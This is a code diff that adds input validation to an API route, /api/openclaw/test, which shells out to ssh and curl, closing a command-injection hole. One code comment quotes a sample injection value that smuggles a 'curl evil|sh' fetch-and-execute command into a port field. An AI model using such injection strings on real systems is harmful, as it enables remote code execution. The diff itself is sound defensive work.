@@ -1987,6 +1987,27 @@ route('POST', '/api/openclaw/test', (_req, res, _params, body) => {
   if (!body || !body.host || !body.sshUser || !body.sshKeyPath) {
     return errorResponse(res, 400, 'host, sshUser, and sshKeyPath are required', 'BAD_REQUEST');
   }
+  // #312: these fields are interpolated into an `ssh ...` shell command below,
+  // so shape-validate them (reusing the detect endpoint's guards — one source
+  // of truth) before any shell-out. Rejects `;`, `$(...)`, backticks, etc.
+  const unsafe = openclawDetect.unsafeReason({
+    host: body.host,
+    sshUser: body.sshUser,
+    sshKeyPath: body.sshKeyPath
+  });
+  if (unsafe) {
+    return errorResponse(res, 400, unsafe, 'BAD_REQUEST');
+  }
+  // #312: `port`/`localPort` are interpolated into the `curl …:<port>/healthz`
+  // shell command below, so they must be plain integers in range — reject
+  // anything else (e.g. `localPort = "1;curl evil|sh"`) before shelling out.
+  for (const [name, val] of [['port', body.port], ['localPort', body.localPort]]) {
+    if (val === undefined || val === null || val === '') continue;
+    const n = Number(val);
+    if (!Number.isInteger(n) || n < 1 || n > 65535) {
+      return errorResponse(res, 400, `${name} must be an integer between 1 and 65535`, 'BAD_REQUEST');
+    }
+  }
 
   const keyPath = body.sshKeyPath.replace(/^~/, process.env.HOME || '');
   const port = body.port || 18789;
